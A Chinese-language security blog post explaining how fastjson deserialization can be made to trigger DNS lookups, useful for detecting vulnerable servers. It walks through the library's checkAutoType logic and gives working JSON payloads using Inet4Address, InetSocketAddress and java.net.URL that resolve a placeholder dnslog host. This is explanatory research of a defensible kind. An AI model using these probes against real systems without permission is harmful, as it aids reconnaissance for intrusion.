---
title: "fastjson dns"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:40:11+08:00
tags: ["poc", "fastjson"]
draft: false
---

## 方法一：java.net.Inet[4|6]Address {#方法一-java-dot-net-dot-inet-4-6-address}

以下两个类没有在黑名单中(v1.2.67)，可以用来发送 dns 请求

```java
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
```

fastjson 在进行反序列化的过程中会执行 checkAutoType 方法对类进行检查（主要通过黑
白名单机制），相关代码如下：

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
    ...
    Class clazz;

    // 1.当打开了 autoTypeSupport，类名又不在白名单时，则进行黑名单检查
    if (!internalWhite && (this.autoTypeSupport || expectClassFlag)) {
        hash = h3;

        for(mask = 3; mask < className.length(); ++mask) {
            hash ^= (long)className.charAt(mask);
            hash *= 1099511628211L;
            ....
            if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null && Arrays.binarySearch(this.acceptHashCodes, fullHash) < 0) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }


    clazz = TypeUtils.getClassFromMapping(typeName);
    if (clazz == null) {
        // 2. fastjson 的 ParserConfig 类自己维护了一个 IdentityHashMap，在这个 HashMap 中的类会被认为是安全的，会直接被返回
        clazz = this.deserializers.findClass(typeName);
    }

    if (clazz == null) {
        clazz = (Class)this.typeMapping.get(typeName);
    }

    if (internalWhite) {
        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
    }

    if (clazz != null) {
        if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) {
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        } else {
            // 3. 直接返回，不再走下面的 autoTypeSupport 和黑名单检查
            return clazz;
        }
    } else {
        // 4. 不开启 autoType 时进行的黑名单检查
        if (!this.autoTypeSupport) {
            hash = h3;

            for(mask = 3; mask < className.length(); ++mask) {
                char c = className.charAt(mask);
                hash ^= (long)c;
                hash *= 1099511628211L;
                if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
                ...
            }
        }
    }
    ...
}
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 1:</span>
  com.alibaba.fastjson.parser.ParserConfig#checkAutoType
</div>

由于 Inet4Address 类不在黑名单中，可以通过 1 处的的的黑名单检查，且它存在于
IdentityHashMap 类中，所以在 3 处直接 return，跳过 4 处的检查，所以无论是否开启
AutoType，都可以跳过 checkAutoType 检查

fastjason 对于 Inet4Address 类会使用 MiscCodec 这个 ObjectDeserializer 来反序列化。跟进
发现解析器会取出 val 字段的值赋值给 strVal 变量，并通过
`InetAddress.getByName(strVal)` 进行域名解析


## 方法二：java.net.InetSocketAddress {#方法二-java-dot-net-dot-inetsocketaddress}

java.net.InetSocketAddress 类也在 IdentityHashMap 中，和方法一一样可以无视
checkAutoType，但是要执行 `InetAddress.getByName()` 需要跟着 json 的语法解析过程来构
造 payload

最终得到的畸形 payload 如下：

```text
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
```


## 方法三：java.net.URL {#方法三-java-dot-net-dot-url}

java.net.URL 类也在 IdentityHashMap 中，同样无视 checkAutoType 检查

这个类的利用思路和 ysoserial 的 URLDNS 一样：向 HashMap 压入一个键值对时，HashMap 需要
获取 key 对象的 hashcode。当 key 对象是一个 URL 对象时，在获取它的 hashcode 期间会调用
getHostAddress 方法获取 host，这个过程域名会被解析

```text
{{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
```

fastjson 解析上述 payload 时，先反序列化出 `URL(http://dnslog)` 对象，然后将
`{URL(http://dnslog):"x"}` 解析为一个 HashMap，最终域名被解析

这个 payload 还有以下变体，原理都相同：

```nil
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
Set[{"@type":"java.net.URL","val":"http://dnslog"}]
Set[{"@type":"java.net.URL","val":"http://dnslog"}
{{"@type":"java.net.URL","val":"http://dnslog"}:0
```
